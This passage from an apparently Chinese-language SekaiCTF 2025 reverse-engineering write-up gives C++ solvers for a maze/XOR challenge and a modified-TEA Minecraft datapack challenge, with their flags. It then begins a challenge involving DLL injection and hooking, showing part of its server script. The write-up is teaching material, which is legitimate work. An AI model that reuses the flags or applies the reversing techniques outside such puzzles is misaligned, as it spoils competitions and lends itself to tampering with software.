class="number">229</span>, <span class="number">232</span>, <span class="number">234</span>, <span class="number">235</span>, <span class="number">236</span>, <span class="number">237</span>, <span class="number">238</span>, <span class="number">240</span>, <span class="number">241</span>, <span class="number">242</span>, <span class="number">244</span>, <span class="number">246</span>, <span class="number">247</span>, <span class="number">248</span>, <span class="number">249</span>, <span class="number">250</span>, <span class="number">253</span>, <span class="number">259</span>, <span class="number">267</span>, <span class="number">271</span>, <span class="number">274</span>, <span class="number">275</span>, <span class="number">276</span>, <span class="number">277</span>, <span class="number">278</span>, <span class="number">279</span>, <span class="number">280</span>, <span class="number">281</span>, <span class="number">282</span>, <span class="number">283</span>, <span class="number">284</span>, <span class="number">285</span>, <span class="number">286</span>, <span class="number">288</span>, <span class="number">290</span>, <span class="number">291</span>, <span class="number">292</span>, <span class="number">295</span>, <span class="number">299</span>, <span class="number">301</span>, <span class="number">303</span>, <span class="number">305</span>, <span class="number">307</span>, <span class="number">309</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">316</span>, <span class="number">318</span>, <span class="number">319</span>, <span class="number">320</span>, <span class="number">322</span>, <span class="number">324</span>, <span class="number">326</span>, <span class="number">328</span>, <span class="number">330</span>, <span class="number">332</span>, <span class="number">334</span>, <span class="number">339</span>, <span class="number">341</span>, <span class="number">345</span>, <span class="number">349</span>, <span class="number">351</span>, <span class="number">355</span>, <span class="number">358</span>, <span class="number">359</span>, <span class="number">360</span>, <span class="number">362</span>, <span class="number">364</span>, <span class="number">365</span>, <span class="number">366</span>, <span class="number">367</span>, <span class="number">368</span>, <span class="number">370</span>, <span class="number">372</span>, <span class="number">373</span>, <span class="number">374</span>, <span class="number">376</span>, <span class="number">379</span>, <span class="number">381</span>, <span class="number">383</span>, <span class="number">387</span>, <span class="number">393</span>, <span class="number">395</span>, <span class="number">397</span>, <span class="number">400</span>, <span class="number">402</span>, <span class="number">404</span>, <span class="number">405</span>, <span class="number">406</span>, <span class="number">408</span>, <span class="number">409</span>, <span class="number">410</span>, <span class="number">412</span>, <span class="number">413</span>, <span class="number">414</span>, <span class="number">416</span>, <span class="number">418</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> XorList[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x09</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0xE4</span>, <span class="number">0x1C</span>, <span class="number">0x81</span>, <span class="number">0x92</span>, <span class="number">0xDB</span>, <span class="number">0x0B</span>, <span class="number">0x75</span>,</span><br><span class="line">            <span class="number">0x26</span>, <span class="number">0x6A</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x76</span>, <span class="number">0x9F</span>,</span><br><span class="line">            <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0x8F</span>, <span class="number">0xCD</span>, <span class="number">0x9F</span>, <span class="number">0x84</span>, <span class="number">0x61</span>, <span class="number">0x3F</span>, <span class="number">0x6D</span>, <span class="number">0x7A</span>,</span><br><span class="line">            <span class="number">0x87</span>, <span class="number">0x1E</span>, <span class="number">0x21</span>, <span class="number">0x99</span>, <span class="number">0xC7</span>, <span class="number">0x65</span>, <span class="number">0xDC</span>, <span class="number">0xC8</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>,</span><br><span class="line">            <span class="number">0x7D</span>, <span class="number">0x28</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0xDC</span>, <span class="number">0x20</span>, <span class="number">0x34</span>, <span class="number">0xED</span>, <span class="number">0xFB</span>, <span class="number">0xD7</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unlock point to locked point (function)</span></span><br><span class="line">    DWORD64 LockPointMap[][<span class="number">2</span>]&#123;&#123;<span class="number">0x14000157E</span>, <span class="number">0x1400014F0</span>&#125;,</span><br><span class="line">                              &#123;<span class="number">0x14000297E</span>, <span class="number">0x1400023D0</span>&#125;,</span><br><span class="line">                              &#123;<span class="number">0x14000365E</span>, <span class="number">0x140001410</span>&#125;,</span><br><span class="line">                              &#123;<span class="number">0x140003F3E</span>, <span class="number">0x140002710</span>&#125;,</span><br><span class="line">                              &#123;<span class="number">0x14000421E</span>, <span class="number">0x140002110</span>&#125;,</span><br><span class="line">                              &#123;<span class="number">0x14000443E</span>, <span class="number">0x140001790</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unlock point to locked point (index)</span></span><br><span class="line">    <span class="type">int</span> LockPointIndexMap[<span class="number">6</span>][<span class="number">2</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> CurrentP1 = LockPointMap[i][<span class="number">0</span>] - <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> CurrentP2 = LockPointMap[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> index1&#123;&#125;, index2&#123;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">441</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (functionList[j] == CurrentP1)</span><br><span class="line">            &#123;</span><br><span class="line">                index1 = j;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (functionList[j] == CurrentP2)</span><br><span class="line">            &#123;</span><br><span class="line">                index2 = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        LockPointIndexMap[i][<span class="number">0</span>] = index1;</span><br><span class="line">        LockPointIndexMap[i][<span class="number">1</span>] = index2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> Pos = <span class="number">22</span>;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::string&gt; Path;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> CanClean = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> MazeMap[<span class="number">21</span> * <span class="number">21</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> StartPos = <span class="number">22</span>, EndPos = <span class="number">418</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span> * <span class="number">21</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Wall</span></span><br><span class="line">            MazeMap[i] = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">199</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SafeRoad</span></span><br><span class="line">            MazeMap[Road[i]] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// StartPos</span></span><br><span class="line">        MazeMap[StartPos] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// EndPos</span></span><br><span class="line">        MazeMap[EndPos] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> index1 = LockPointIndexMap[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">auto</span> index2 = LockPointIndexMap[i][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// unlock point</span></span><br><span class="line">            MazeMap[index1] = <span class="string">&#x27;A&#x27;</span> + i;</span><br><span class="line">            <span class="comment">// locked point</span></span><br><span class="line">            MazeMap[index2] = <span class="string">&#x27;a&#x27;</span> + i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// print out result</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_HOME))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Size:%d\n&quot;</span>, Path.<span class="built_in">size</span>());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> p_ : Path)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.2s&quot;</span>, p_.<span class="built_in">c_str</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// up</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_UP))</span><br><span class="line">        &#123;</span><br><span class="line">            Path.<span class="built_in">push_back</span>(<span class="string">&quot;00&quot;</span>);</span><br><span class="line">            Pos -= <span class="number">21</span>;</span><br><span class="line">            CanClean = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// down</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_DOWN))</span><br><span class="line">        &#123;</span><br><span class="line">            Path.<span class="built_in">push_back</span>(<span class="string">&quot;10&quot;</span>);</span><br><span class="line">            Pos += <span class="number">21</span>;</span><br><span class="line">            CanClean = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// left</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_LEFT))</span><br><span class="line">        &#123;</span><br><span class="line">            Path.<span class="built_in">push_back</span>(<span class="string">&quot;11&quot;</span>);</span><br><span class="line">            Pos--;</span><br><span class="line">            CanClean = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// right</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_RIGHT))</span><br><span class="line">        &#123;</span><br><span class="line">            Path.<span class="built_in">push_back</span>(<span class="string">&quot;01&quot;</span>);</span><br><span class="line">            Pos++;</span><br><span class="line">            CanClean = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// clean and output</span></span><br><span class="line">        <span class="keyword">if</span> (CanClean)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">            CanClean = <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">// print out map</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">21</span>; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i * <span class="number">21</span> + j == Pos)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// current point</span></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;P &quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, MazeMap[i * <span class="number">21</span> + j]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>走完所有路程到终点，按Home输出路程大小以及路程01数据。</p><p><img src="/2025/08/19/SekaiCTF2025/image-11.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::string Path = <span class="string">&quot;1010010101010000101001010101101001010101101011111010111111111010111111010101000001010101000001010000000000000101101010100101101001011000111100001111000000001111101010101010111110101111111110101010111110101010100000000000010100000000010101010000111111111101010101011010111111111010101001011010101001011111000000001111000000000101010100000101000000000000010110101010010110100101101010101010101010101010&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> XorList[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x09</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0xE4</span>, <span class="number">0x1C</span>, <span class="number">0x81</span>, <span class="number">0x92</span>, <span class="number">0xDB</span>, <span class="number">0x0B</span>, <span class="number">0x75</span>,</span><br><span class="line">            <span class="number">0x26</span>, <span class="number">0x6A</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0xDD</span>, <span class="number">0xD2</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x76</span>, <span class="number">0x9F</span>,</span><br><span class="line">            <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0x8F</span>, <span class="number">0xCD</span>, <span class="number">0x9F</span>, <span class="number">0x84</span>, <span class="number">0x61</span>, <span class="number">0x3F</span>, <span class="number">0x6D</span>, <span class="number">0x7A</span>,</span><br><span class="line">            <span class="number">0x87</span>, <span class="number">0x1E</span>, <span class="number">0x21</span>, <span class="number">0x99</span>, <span class="number">0xC7</span>, <span class="number">0x65</span>, <span class="number">0xDC</span>, <span class="number">0xC8</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>,</span><br><span class="line">            <span class="number">0x7D</span>, <span class="number">0x28</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0xDC</span>, <span class="number">0x20</span>, <span class="number">0x34</span>, <span class="number">0xED</span>, <span class="number">0xFB</span>, <span class="number">0xD7</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Path.<span class="built_in">size</span>(); i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j += <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> b = std::<span class="built_in">stoi</span>(Path.<span class="built_in">substr</span>(i + j, <span class="number">2</span>), <span class="literal">nullptr</span>, <span class="number">2</span>);</span><br><span class="line">            b &lt;&lt;= <span class="number">2</span> * (j / <span class="number">2</span>);</span><br><span class="line">            c += b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c ^ XorList[i / <span class="number">8</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SEKAI&#123;https://www.youtube.com/watch?v=J---aiyznGQ&#125;</code></p><h2 id="Sekai-Craft"><a href="#Sekai-Craft" class="headerlink" title="Sekai-Craft"></a>Sekai-Craft</h2><p>考点：MC计分板命令，魔改Tea</p><p>核心代码就在<code>Sekai-Craft\mvm\datapacks\mvm\data\mvm\function\mvm.mcfunction</code>中。</p><p>可以先用代码提取出里面的Delta、Key[4]、Cipher三个数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">file</span><span class="params">(<span class="string">&quot;C:\\Users\\Liv\\Desktop\\mvm.mcfunction.txt&quot;</span>, std::ios::in)</span></span>;</span><br><span class="line"></span><br><span class="line">    std::string Buffer;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> Count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    std::string Dest = <span class="string">&quot;scoreboard players set delta_&quot;</span>;</span><br><span class="line">    <span class="comment">// scoreboard players set k0</span></span><br><span class="line">    <span class="comment">// scoreboard players set k1</span></span><br><span class="line">    <span class="comment">// scoreboard players set k2</span></span><br><span class="line">    <span class="comment">// scoreboard players set k3</span></span><br><span class="line">    <span class="comment">// scoreboard players set cipher0</span></span><br><span class="line">    <span class="comment">// scoreboard players set cipher1</span></span><br><span class="line">    <span class="comment">// scoreboard players set cipher2</span></span><br><span class="line">    <span class="comment">// scoreboard players set cipher3</span></span><br><span class="line"></span><br><span class="line">    std::string Bits;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (std::<span class="built_in">getline</span>(file, Buffer))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!Buffer.<span class="built_in">empty</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">auto</span> index = Buffer.<span class="built_in">find</span>(Dest);</span><br><span class="line">            <span class="keyword">if</span> (index != std::string::npos)</span><br><span class="line">            &#123;</span><br><span class="line">                index = Buffer.<span class="built_in">find</span>(<span class="string">&quot;bit&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (index != std::string::npos)</span><br><span class="line">                &#123;</span><br><span class="line">                    Bits += Buffer.<span class="built_in">substr</span>(index + <span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::<span class="built_in">reverse</span>(Bits.<span class="built_in">begin</span>(), Bits.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, Bits.<span class="built_in">c_str</span>());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%X\n&quot;</span>, std::<span class="built_in">stoul</span>(Bits, <span class="literal">nullptr</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过观察加密过程，他是把正常4字节运算展开到位单位计算，所以显得复杂，把代码按一块一块分析比较方便。</p><p>最后分析结果如下，魔改点就一处，直接异或上key[sum &amp; 3]和key[(sum &gt;&gt; 11) &amp; 3]，而标准的是有加上sum值的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p>通过搜索部分代码可知，一共执行了64轮计算，由于有4个4字节密文也就是两组加密，所以Tea加密是32轮计算。</p><p><img src="/2025/08/19/SekaiCTF2025/image-12.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0xAEF98DA</span>, sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key[]&#123;<span class="number">0x5F7438DA</span>, <span class="number">0xF1FA60FB</span>, <span class="number">0x289C2239</span>, <span class="number">0x88042CB9</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> Cipher[]&#123;<span class="number">0x1021D4FF</span>, <span class="number">0xA32B2EAD</span>, <span class="number">0x4C38D5E</span>, <span class="number">0x15A65D4B</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decipher</span>(Cipher, Key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint8_t</span> *)Cipher + <span class="number">8</span>), Key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SEKAI&#123;%.16s&#125;\n&quot;</span>, (PUCHAR)Cipher);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SEKAI&#123;s3k41cr4tg00d:^)&#125;</code></p><h2 id="Alchemy-Master"><a href="#Alchemy-Master" class="headerlink" title="Alchemy Master"></a>Alchemy Master</h2><p>质量最高的题。</p><p>考点：服务端逆向，DLL远程线程注入，函数Hook，代码编译，CL编译中元数据计算</p><h3 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h3><p>要求输入CPP的代码，然后写到solution.cpp，传入solution.cpp目录参数执行launch.exe。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> TemporaryDirectory</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">launch_exe = Path(__file__).parent / <span class="string">&#x27;launch.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> launch_exe.exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;something is wrong! contact admins&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hi! please enter your cpp code line by line, then end it with a __END__ line&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        l = <span class="built_in">input</span>()</span><br><span class="line">        <span class="keyword">if</span> l == <span class="string">&#x27;__END__&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lines.append(l)</span><br><span class="line"></span><br><span class="line">    code = <span class="string">&#x27;\n&#x27;</span>.join(lines)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;gotcha, lets compile this!&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> TemporaryDirectory() <span class="keyword">as</span> tmpdir:</span><br><span class="line">        cwd = <span class="built_in">str</span>(Path(tmpdir).absolute())</span><br><span class="line">        file_path = Path(tmpdir) / <span class="string">&#x27;solution.cpp&#x27;</span></span><br><span class="line">        <span 